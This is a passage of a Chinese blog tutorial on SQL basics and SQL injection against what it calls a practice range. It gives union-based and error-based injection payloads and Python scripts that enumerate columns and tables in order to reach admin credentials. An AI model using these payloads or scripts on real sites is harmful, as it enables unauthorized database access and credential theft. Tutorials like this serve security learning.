WHERE"></a>(2) WHERE</h4><p>我们还是拿website表举例</p><p>我现在想要 website 中 id=2 的那行数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from website where id=2</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221224174204.webp" alt=""></p><p>这里where的作用就像筛选一样</p><p>我现在想要 country字段是CN的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from website where country=&#x27;CN&#x27;  // 这里注意，SQL语句里没有双引号</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221224174441.webp" alt=""></p><h4 id="3-AND"><a href="#3-AND" class="headerlink" title="(3) AND"></a>(3) AND</h4><p>我现在想要在website表中找 id=1 并且 country是CN的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from website where id=1 and country=&#x27;CN&#x27;</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221224174739.webp" alt=""></p><p>这里and的作用就是“并且”</p><p>and需要两面都成立</p><p>比如这样就不行</p><p>这句话执行后没有结构，因为后面的 1=2 不成立</p><p>把 1=2 改成 1=1 这句话就能正常执行了</p><h4 id="4-OR"><a href="#4-OR" class="headerlink" title="(4) OR"></a>(4) OR</h4><p>我现在想要在website表中找 id=1或者 country=’CN’ 的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from website where id=1 or country=&#x27;CN&#x27;</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221224174955.webp" alt=""></p><p>or是双方只要一个成立就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from website where (id=1 and country=&#x27;CN&#x27; and 1=2) or id=2</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221224175328.webp" alt=""></p><p>这里 id=1 and country=’CN’ and 1=2 是无法成立的</p><p>但是因为加了or，后面的id=2成立，结果就输出了id=2的数据</p><h4 id="5-order-by"><a href="#5-order-by" class="headerlink" title="(5) order by"></a>(5) order by</h4><p>order by会根据所选字段进行排序</p><p>我们让website表根据age字段排序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from website order by age</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221224175849.webp" alt=""></p><p>由小到大进行了排序</p><p>我们还可以让它根据第几个字段进行排序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from website order by 5 // 根据第5个字段进行排列</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221225123434.webp" alt=""></p><p>我们这个表只有7个字段，那我们 order by 8 会怎么样呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from website order by 8 </span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221225123613.webp" alt=""></p><p>它说没找到第8列</p><p>所以我们实战中可以通过这样来判断这个表有几个字段</p><p>如果5没报错，6报错了，说明这张表有5个字段</p><h4 id="6-UNION"><a href="#6-UNION" class="headerlink" title="(6) UNION"></a>(6) UNION</h4><p><img src="\media\2022\12\Pasted-image-20221225123918.webp" alt=""></p><p>test数据库下有两张表，我想要同时查看两张表的数据怎么办呢？</p><p>这个时候就可以用UNION来联合输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from admin union select * from website</span><br><span class="line"></span><br><span class="line">// 这句话的意思是，同时执行 select * from admin 和 select * from website</span><br><span class="line">// 这个会报错</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221225124306.webp" alt=""></p><p>报错说，这两张表有不同的字段数</p><p>所以使用union的时候，前后命令所输出的结果必须字段数相同</p><p>意思是说，admin中有两个字段，select <em> from admin 输出就是两个字段<br>但是，website有7个字段，select </em> from website 输出的就是7个字段<br>这两个结果输出的字段不同，无法通过union运行</p><p>那我们稍微改改，既然admin是两个字段，那我们就再union一个两个字段的不就好了嘛</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from admin union select id, name from website</span><br><span class="line"></span><br><span class="line">// 这句话的意思是同时运行 select * from admin 和 select id, age from website</span><br><span class="line">// 前面两个字段，后面两个字段</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221225125904.webp" alt=""></p><h4 id="7-SELECT-UNION"><a href="#7-SELECT-UNION" class="headerlink" title="(7) SELECT + UNION"></a>(7) SELECT + UNION</h4><p>我们可以直接select数字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3,4,5,6,7</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221225125904-1.webp" alt=""></p><p>一个数字就是一个字段，这里是1到7，就是有7个字段</p><p>我们可以通过这个机制来和union结合</p><p>admin有两个字段，我们可以这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin union select 1,2</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221225130315.webp" alt=""></p><p>website表是7个字段，同理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from website union select 1,2,3,4,5,6,7 </span><br></pre></td></tr></table></figure><h4 id="8-database"><a href="#8-database" class="headerlink" title="(8) database()"></a>(8) database()</h4><p>database()代表当前数据库</p><p>我们通过select来试一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,database()</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221225131738.webp" alt=""></p><p>或者这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin union select 1,database()</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221225131849.webp" alt=""></p><h4 id="9-limit"><a href="#9-limit" class="headerlink" title="(9) limit"></a>(9) limit</h4><p>我想查看website表的第一行</p><p>通过limit可以这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from website limit 0,1</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221225133127.webp" alt=""></p><p>这句话的意思是，从第零行开始，往上查看一个，0往上一个就是1</p><p>那么我想查看第三行呢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from website limit 2,1</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221225133357.webp" alt=""></p><p>从第二行开始往上一个，就是第三行</p><p>那要是看第5行和第6行呢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from website limit 4,2</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221225133708.webp" alt=""></p><p>从第4行开始，往上查看两行就是第五行和第六行</p><h4 id="10-注释"><a href="#10-注释" class="headerlink" title="(10) 注释"></a>(10) 注释</h4><p>我们SQL语句有一个注释</p><p>我们看看这个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id = &#x27;1&#x27; -- &#x27;</span><br></pre></td></tr></table></figure><p>这句话就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id = &#x27;1&#x27;</span><br></pre></td></tr></table></figure><p>因为后面的 ‘ 被注释掉了</p><h4 id="11-sleep"><a href="#11-sleep" class="headerlink" title="(11) sleep"></a>(11) sleep</h4><p>我们可以通过sleep函数让数据库睡一觉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sleep(5)  // 睡5秒</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221225202737.webp" alt=""></p><p><img src="\media\2022\12\Pasted-image-20221225202830.webp" alt=""></p><p>可以看到，执行了 5秒 多</p><p>这个sleep函数还有一个神奇的小特性，在下面时间盲注那里会讲到</p><h4 id="12-length"><a href="#12-length" class="headerlink" title="(12) length"></a>(12) length</h4><p>length() 函数可以返回字符串的长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `admin`where id=1 and length(database())&gt;1</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221225205512.webp" alt=""></p><p>这里的length(database())&gt;1代表数据库名字的长度大于一，有结果返回说明名字长度大于一成立</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `admin`where id=1 and length(database())=5</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221225205647.webp" alt=""></p><p>没有返回说明 数据库长度等于5不成立</p><p>当然你也可以使用其他的运算，什么 &lt; &gt; = 都可以用</p><p>记得这个需要加上where条件，不叫会报错</p><p>我们可以通过这样的方式猜<strong>数据库名称</strong>，<strong>表名称</strong>，<strong>字段名称</strong>的长度</p><h4 id="13-substr"><a href="#13-substr" class="headerlink" title="(13) substr"></a>(13) substr</h4><p>substr() 截取字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `admin` WHERE id=1 AND substr(DATABASE(),1,1)=&#x27;t&#x27;</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221226093416.webp" alt=""></p><p>这里的 substr(DATABASE(),1,1)=’t’ 代表 截取数据库的第一个字符，这个字符等于t</p><p>因为我们的数据库名称为test，所以等于t成立，所以能正常返回 id=1 的内容</p><p>这里 1,1 代表 从第一位开始截取一个，就是 t</p><p>1,2 代表从第一位开始，截取2个，就是 te</p><p>2,2 代表从第二位开始，截取两个，就是es</p><p><img src="\media\2022\12\Pasted-image-20221226095039.webp" alt=""></p><p>有返回的结果说明 substr(DATABASE(),2,2)=’es’ 成立</p><h4 id="14-ord-ascill"><a href="#14-ord-ascill" class="headerlink" title="(14) ord()/ascill()"></a>(14) ord()/ascill()</h4><p>ord()，ascill() 这两个功能一样，都是来返回字符的ascill码</p><p>我们来试一下</p><p>我们的数据库名称是test，t对应的ascii码是116</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE id=1 AND ord(substr(database(),1,1))=116</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221226100006.webp" alt=""></p><p>返回数据，说明 ord(substr(database(),1,1))=116 成立，代表数据库的第一个字符的ascii码是116</p><p>这里 ord(substr(database(),1,1))=116 代表 数据库的第一个字符的ascii码是116</p><p>当然 ascii() 也是一样的</p><p>我们拿数据库第二位试试，第二位是e，e的 ascii 码是 101</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE id=1 AND ascii(substr(database(),2,1))=101</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221226100333.webp" alt=""></p><p>有结果返回，说明 ascii(substr(database(),2,1))=101 成立，即数据库第二位的 ascii码 是101</p><p>我们可以通过这样的方式猜<strong>数据库名称</strong>，<strong>表名称</strong>，<strong>字段名称</strong>的ascii码，然后在把 ascii码 反编译得到正确的名称</p><h4 id="15-if"><a href="#15-if" class="headerlink" title="(15) if"></a>(15) if</h4><p>我们看一下这个例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(1=1,3,4)</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221226102909.webp" alt=""></p><p>这里是 1=1 返回了3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(1=2,3,4)</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221226103029.webp" alt=""></p><p>这里是 1=2 返回了4</p><p>if 的用法就是：<strong>if(a,b,c)，如果a成立，返回b；a不成立，返回c</strong></p><h4 id="16-count"><a href="#16-count" class="headerlink" title="(16) count"></a>(16) count</h4><p>count函数可以让你知道个数</p><p>我们想要知道test数据库下的admin表中的name字段有几个数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(name) from test.admin  // test.admin 代表 test库下的admin表</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221226115857.webp" alt=""></p><p>这样就得到了有几个了</p><h4 id="17-concat"><a href="#17-concat" class="headerlink" title="(17) concat"></a>(17) concat</h4><p>我们可以通过concat让两个结果成为一个组，然后再输出</p><p>我们现在想要把admin表中的 id和name 的结果放到一起输出，不是像union那种，是真正的放一起</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(id,name) from admin</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221226145627.webp" alt=""></p><p>可以看到id和name放在一起了</p><p>但有的时候，我们把它放一起后，无法辨别哪个是哪个，我们可以加一点东西</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat(id,&#x27;@&#x27;,name)</span><br></pre></td></tr></table></figure><p>这样输出的话就会把 @ 带上，数据就可以分为 @ 前面的和 @ 后面的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(id,&#x27;@&#x27;,name) from admin</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221226150400.webp" alt=""></p><p>这样就能区分了</p><h4 id="18-insert-into"><a href="#18-insert-into" class="headerlink" title="(18) insert into"></a>(18) insert into</h4><p>insert的作用是向表插入数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO admin(id,name) VALUES (123,&#x27;test1&#x27;)</span><br></pre></td></tr></table></figure><p>这句话我们拆开来记：</p><p>我们想要插入数据，写 insert into；向 admin 表里插入数据就是 admin；数据加在 admin 的 id 和 name 字段中，就是(id,name)；假加入对应值就是value；值的内容是 123 和 test1，就是(123,’test1’)</p><p>我们看一下结果</p><p><img src="\media\2022\12\Pasted-image-20221226175749.webp" alt=""></p><p>这里不会返回任何结果</p><p><img src="\media\2022\12\Pasted-image-20221226175825.webp" alt=""></p><p>成功插入</p><p>这里要注意，你插入的数据一定要和字段的数据类型相匹配</p><p>比如这里的 id字段，是int类型，所以它下面只能是数字；name字段是 varchar 类型，那么它的数据只能是字符串。</p><h4 id="19-updatexml"><a href="#19-updatexml" class="headerlink" title="(19) updatexml"></a>(19) updatexml</h4><p>更新xml文档的函数</p><p>这个东西我们主要用于报错注入的，让结果显示在报错里</p><p>我们看这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT updatexml(1,&#x27;~&#x27;,1)</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221226181744.webp" alt=""></p><p>可以发现SQL语句里的第二个参数显示在报错中</p><p>我们试试database()</p><p>这里，如果想显示SQL语句的结果的话，需要与concat配合</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT updatexml(1,concat(&#x27;~&#x27;,(select database())),1)</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Pasted-image-20221226182154.webp" alt=""></p><p>这样就得到了数据库的名称</p><h3 id="5-一些重要的表"><a href="#5-一些重要的表" class="headerlink" title="5. 一些重要的表"></a>5. 一些重要的表</h3><h4 id="1-information-schema库下的schemata表"><a href="#1-information-schema库下的schemata表" class="headerlink" title="(1) information_schema库下的schemata表"></a>(1) information_schema库下的schemata表</h4><p>这张表的数据结构是这样的</p><p><img src="\media\2022\12\Pasted-image-20221224172247.webp" alt=""></p><p>这张表的 <strong>schema_name</strong> 字段包含了当前服务器的所有数据库名称</p><h4 id="2-information-schema库下的tables表"><a href="#2-information-schema库下的tables表" class="headerlink" title="(2) information_schema库下的tables表"></a>(2) information_schema库下的tables表</h4><p>这张表的数据结构是这样的</p><p><img src="\media\2022\12\Pasted-image-20221224172655.webp" alt=""></p><p>这张表有两个神奇的字段，一个是table_schema，另一个是table_name</p><p>其中 table_schema 包含了服务器的所有库名，而 table_name 包含了服务器的所有表名</p><h4 id="3-information-schema库下的columns表"><a href="#3-information-schema库下的columns表" class="headerlink" title="(3) information_schema库下的columns表"></a>(3) information_schema库下的columns表</h4><p>这张表更神奇，先看它的结构</p><p><img src="\media\2022\12\Pasted-image-20221224173159.webp" alt=""></p><p>它有三个牛逼的字段，table_schema(数据库名)，table_name(表名)，column_name</p><p>其中table_schema和table_name我们上面讲过了，这个column_name是包含了服务器中所有的字段名</p><h2 id="二-SQL注入原理"><a href="#二-SQL注入原理" class="headerlink" title="二. SQL注入原理"></a>二. SQL注入原理</h2><h3 id="1-什么是SQL注入"><a href="#1-什么是SQL注入" class="headerlink" title="1. 什么是SQL注入"></a>1. 什么是SQL注入</h3><p>攻击者通过构造不同的SQL语句来实现对数据库的操作</p><h3 id="2-有SQL漏洞的网站基本要求"><a href="#2-有SQL漏洞的网站基本要求" class="headerlink" title="2. 有SQL漏洞的网站基本要求"></a>2. 有SQL漏洞的网站基本要求</h3><h4 id="1-用户参数可控"><a href="#1-用户参数可控" class="headerlink" title="(1) 用户参数可控"></a>(1) 用户参数可控</h4><p>什么叫做用户参数可控呢？</p><p>我们看看这个网站</p><p><img src="\media\2022\12\Pasted-image-20221225134633.webp" alt=""></p><p>它上面有一个id=1</p><p>我们尝试把 id=1 改成 id=2</p><p><img src="\media\2022\12\Pasted-image-20221225134716.webp" alt=""></p><p>可以发现，页面发生了变化</p><p>我们可以对 id 这个参数的值进行修改，并且改参数后页面会发生改变</p><p>这就叫做用户参数可控</p><h4 id="2-我们构造的的语句能进入数据库进行操作"><a href="#2-我们构造的的语句能进入数据库进行操作" class="headerlink" title="(2) 我们构造的的语句能进入数据库进行操作"></a>(2) 我们构造的的语句能进入数据库进行操作</h4><p>所谓 “能进入数据库” 进行操作，就是能对数据库进行 <strong>“增删改查”</strong></p><p>我们上面那个改 id 参数的那个网站，是不是特别熟悉啊</p><p>它不就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 数据库 where id=%d  // 这个 %d 代表数字</span><br></pre></td></tr></table></figure><p>它是不是对数据库进行查找了啊</p><p>这就是 “增删改查” 中的 “查”</p><p>再看看这个</p><p><img src="\media\2022\12\Pasted-image-20221225135618.webp" alt=""></p><p>这个注册是不是向数据库中写入你的信息啊，这就是 ”增“</p><p>这个搜索是不是从数据库中查找你的要的内容啊，这就是 ”查“</p><p>我们再看这个</p><p><img src="\media\2022\12\Pasted-image-20221225135817.webp" alt=""></p><p>我们点击归档的时候，当前这个客户端就向服务器发送了一个数据包，告诉服务器我要看归档，然后服务器就在当前网站的数据库里找对应的有关归档的信息，然后在发一个数据包到客户端，然后我们就能看到内容了。</p><p>这个过程也是 ”查“</p><p>还有这个</p><p><img src="\media\2022\12\Pasted-image-20221225140744.webp" alt=""></p><p>这个不就是 order by 排序嘛</p><p>再举最后一个例子</p><p>我们打开”开发者选择“</p><p><img src="\media\2022\12\Pasted-image-20221225141037.webp" alt=""></p><p>在我们的网络抓包中，有些网站会去收集检测你这个这个请求头，看看是不是自动化，爬虫之类的。</p><p>以上举的所有例子都是能与数据库发生交互的地方</p><h3 id="3-如何判断这个地方有没有SQL漏洞"><a href="#3-如何判断这个地方有没有SQL漏洞" class="headerlink" title="3. 如何判断这个地方有没有SQL漏洞"></a>3. 如何判断这个地方有没有SQL漏洞</h3><p>有SQL注入的前提是你的SQL语句能传进数据库</p><p>比如这个</p><p>我这里为了操作方便用了一个叫 postman 的工具</p><p><img src="\media\2022\12\Pasted-image-20221225141857.webp" alt=""></p><p>我们在 id=1 传入 and 1=1</p><p>然后它能正常显示</p><p>我们传入 1=2 呢？</p><p><img src="\media\2022\12\Pasted-image-20221225142013.webp" alt=""></p><p>发现它不能正常显示内容</p><p>为什么呢？</p><p>因为我们的这句话传入了数据库</p><p>我们传入 1=1 的时候是这样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 数据库 where id=1 and 1=1</span><br></pre></td></tr></table></figure><p>这样SQL语法没毛病，能够正常返回内容</p><p>但是 1=2 的时候却是这样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 数据库 where id=1 and 1=2</span><br></pre></td></tr></table></figure><p>后面的 1=2 不成立，用的是and语句，找不到符合的数据，数据为空</p><p>通过这样的方法来判断SQL语句是否传入了数据库</p><p>当然，加减法也行</p><p><img src="\media\2022\12\Pasted-image-20221225142623.webp" alt=""></p><p>不过加法有个问题</p><p>我们试一下</p><p><img src="\media\2022\12\Pasted-image-20221225142702.webp" alt=""></p><p>数据为空，这是为啥呢？</p><p>因为在URL中，+等于空格，我们写的是 1+1=2 但实际上它传的是 1 1=2</p><p>这时候用URL编码就行了，+ 的URL编码是 %2</p><p><img src="\media\2022\12\Pasted-image-20221225142840.webp" alt=""></p><h2 id="三-SQL注入-联合注入"><a href="#三-SQL注入-联合注入" class="headerlink" title="三. SQL注入 - 联合注入"></a>三. SQL注入 - 联合注入</h2><p>我们拿这个网站举例</p><p><strong>靶场：<a href="http://cntj8003.ia.aqlab.cn/?id=1">宠物猫 异国短毛猫 纯种猫 加菲猫 波斯猫 辛巴猫舍 纯种双色/梵文波斯、异国小猫 CFA注册猫舍 (aqlab.cn)</a></strong></p><p>我们要先知道SQL注入要找什么</p><p><strong>找后台网站的账号和密码</strong></p><p>这个账号和密码在哪里？在我们的字段中</p><p>那么字段在哪里？在表里</p><p>那么这表在哪里呢？表在我们的数据库中</p><p>我们现在一不知道字段，二不知道表明，三不知道数据库名，怎么获取信息呢？</p><p>我们可以通过上面介绍的 information_schema数据库 下的 tables 表。</p><p>这个表里有两个字段，一个是 table_schema 有着所有的数据库信息</p><p>还有一个字段是 table_name 有着所有的表名</p><p>还有一张表，是columns表，他里头有一个字段是 columnt_name</p><p>它是服务器的所有字段名</p><p>这样思路就清晰了</p><h3 id="1-猜字段数"><a href="#1-猜字段数" class="headerlink" title="1. 猜字段数"></a>1. 猜字段数</h3><h4 id="1-用order-by直接试"><a href="#1-用order-by直接试" class="headerlink" title="(1) 用order by直接试"></a>(1) 用order by直接试</h4><p>我们先通过 order by 来判断字段数</p><p>你可以一个一个的去试，就是 order by 1 没报错，order by 5报错了，说明字段数有4个</p><p><img src="\media\2022\12\Pasted-image-20221225182126.webp" alt=""></p><p><img src="\media\2022\12\Pasted-image-20221225182221.webp" alt=""></p><p>这里 order by 2 有显示， order by 3 没有</p><p>说明字段数是 2</p><p>在这个，有显示的叫做有 ”回显“，没有显示的叫做 ”无回显“</p><h4 id="2-用脚本"><a href="#2-用脚本" class="headerlink" title="(2) 用脚本"></a>(2) 用脚本</h4><p>我们可以写一个自动化脚本来猜</p><p>这个 order by 1，order by 2 中的这个数字可以用循环来获取、</p><p>由于正常显示的时候必定有一段数据回显，比如这里的这个：</p><p><img src="\media\2022\12\Pasted-image-20221225182620.webp" alt=""></p><p>如果正常的话一定显示这些内容，不符合就没有回显，我们可以加一个判断语句</p><p><img src="\media\2022\12\Pasted-image-20221225183431.webp" alt=""></p><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests  </span><br><span class="line"></span><br><span class="line">text = &quot;我们是辛巴猫舍，位于中国。&quot;  </span><br><span class="line"></span><br><span class="line">headers = &#123;  </span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54&quot;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">for i in range(1, 100):  </span><br><span class="line">    response = requests.get(f&quot;http://cntj8003.ia.aqlab.cn/?id=1 order by &#123;i&#125;&quot;)  </span><br><span class="line">    response.encoding = &quot;utf8&quot;  </span><br><span class="line">    if text in response.text:  </span><br><span class="line">        pass    </span><br><span class="line">    else:        </span><br><span class="line">        print(f&quot;字段数为&#123;i - 1&#125;&quot;)  </span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p>我这里是拿python写的，当然你也可以用其他语言写一个脚本</p><h3 id="2-union-获得空字段"><a href="#2-union-获得空字段" class="headerlink" title="2. union 获得空字段"></a>2. union 获得空字段</h3><p>我们知道 select 1,2 可以显示 1,2，并且有一个数就是一个字段</p><p>union 可以显示前后两个字段相同的表数据</p><p>那我们可以这样：</p><p>我们先用 1=2 让正常的数据不显示，但是这张表的字段数是一定的，这时候我们加上union select 就可以让数字 1,2,3 显示</p><p><img src="\media\2022\12\Pasted-image-20221225184956.webp" alt=""></p><h3 id="3-把空字段改成其他数据"><a href="#3-把空字段改成其他数据" class="headerlink" title="3. 把空字段改成其他数据"></a>3. 把空字段改成其他数据</h3><p>这里显示的数字是 2 我们就可以把数字2改成其他的数据，比如database()</p><p><img src="\media\2022\12\Pasted-image-20221225185204.webp" alt=""></p><p>我们就这样得到了数据库名称 maoshe</p><p>接着，通过information_schema 这个库就可以得到其他的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1</span><br></pre></td></tr></table></figure><p>我们开分析一下这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table_name from information_schema.tables where table_schema=database() limit 0,1</span><br></pre></td></tr></table></figure><p>我们查看 table_name 这个字段，这个字段来自 information_schema.tables 库，筛选条件为 table_schema 字段内容为 database() ，我们查询第一条数据。</p><p><img src="\media\2022\12\Pasted-image-20221225190759.webp" alt=""></p><p>这样就得到了当前表的第一行数据</p><p>我们可以可以再写一个脚本</p><p>我们可以看见，显示的结果在 \/html/body/div[1]/div[3]</p><p><img src="\media\2022\12\Pasted-image-20221225191020.webp" alt=""></p><p>我们写一个脚本</p><p><img src="\media\2022\12\Pasted-image-20221225192023.webp" alt=""></p><p>这样就得到了当前数据库下的四张表</p><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests  </span><br><span class="line">from lxml import etree  </span><br><span class="line"></span><br><span class="line">for i in range(100):  </span><br><span class="line">    url = f&quot;http://cntj8003.ia.aqlab.cn/?id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit &#123;i&#125;,1&quot;  </span><br><span class="line">    response = requests.get(url)  </span><br><span class="line">    response.encoding = &quot;utf8&quot;  </span><br><span class="line">    response_tree = etree.HTML(response.text)  </span><br><span class="line">    database = response_tree.xpath(&quot;/html/body/div[1]/div[3]/text()&quot;)  </span><br><span class="line">    if database == [&#x27;\n  &#x27;]:  </span><br><span class="line">        break    </span><br><span class="line">    else:        </span><br><span class="line">        print(database)</span><br></pre></td></tr></table></figure><p>我们得到了四张表，其中一个是 admin 表，这里应该就是有着账号密码的表</p><p>我们可以通过 information 库下的 columns 表，获得admin表下的内容</p><p><img src="\media\2022\12\Pasted-image-20221225193135.webp" alt=""></p><p>这样我们就得到了admin表下所有字段</p><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 